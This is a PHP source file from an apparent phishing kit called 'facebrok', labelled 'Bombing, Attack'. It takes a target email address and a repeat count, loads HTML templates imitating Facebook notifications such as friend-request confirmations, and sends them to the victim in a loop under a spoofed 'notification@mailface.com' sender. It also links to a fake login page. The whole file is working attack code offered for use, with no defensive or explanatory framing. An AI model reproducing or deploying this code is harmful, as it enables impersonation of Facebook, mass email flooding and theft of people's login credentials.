<?php
// facebrok 
// Bombing, Attack.
session_start();
error_reporting(E_ALL^E_NOTICE);
if($_SESSION['user']){
include ("config.php");
mysql_connect($DB_SERV,$DB_USER,$DB_PASS) or die ('Failed Connection: '.mysql_error());
mysql_select_db($DB_NADB) or die ('Failed in Databases: '.mysql_error());
$var="http://".$_SERVER['HTTP_HOST']."/login.php?view=fbimga100mstartpre";
?>
<!--
 ______
 | ___|
 | |_____________________  ___ _______  __
 |  ______ | ___|  __ | |__| |/ /_ | | / /
 | || |  | | |  | ____| __ | | / | | |/ /
 | || |__| | |__| |___||_| |  /|_| |   |
 |_||____,,|____|_____|____|__|____|_|\_\
        one tool awesome for you.
-->
<title>facebrok - bombing</title>
<link rel="shortcut icon" href="facebook.png" />
<link href="minify.css" rel="stylesheet" type="text/css"/>
<link href="login.css " rel="stylesheet" type="text/css"/>
<body class="login">
<style type="text/css" media="screen"><!--a:link   {text-decoration:none;}   --></style>
<div class="content">
<h4 class="form-title" title="methods"><center>Attack<center></h4>
<div id="a">

<?php




$plant=$_POST['plant'];
$target=$_POST['target'];
$many=$_POST['many'];
if($plant=="1"){$title='Check out my fb profile';include("spammers/checkoutmyfacebookprofile.php");}
if($plant=="2"){$title='You have new notifications';include("spammers/youhavenewnotifications.php");}
if($plant=="3"){$title='Confirmed your friend request fb';include("spammers/confirmedyourfriendrequestfacebook.php");}


$headers = 'From: notification@mailface.com' . "\r\n" .
             'Reply-To: '.$target.'' . "\r\n" .
             'MIME-Version: 1.0' . "\r\n" .
			 'Content-type: text/html; charset=iso-8859-1' . "\r\n";

 for($x=0; $x<$many; $x++){
 print " Sending to ".$target."...";
 mail($target, $title, $html, $headers);
 print ("<font color=\"green\"> OK.<br></font>");
 flush();
}
 print "<font color=\"red\"><br>Done.";
} else {header("location:../croak");} ?>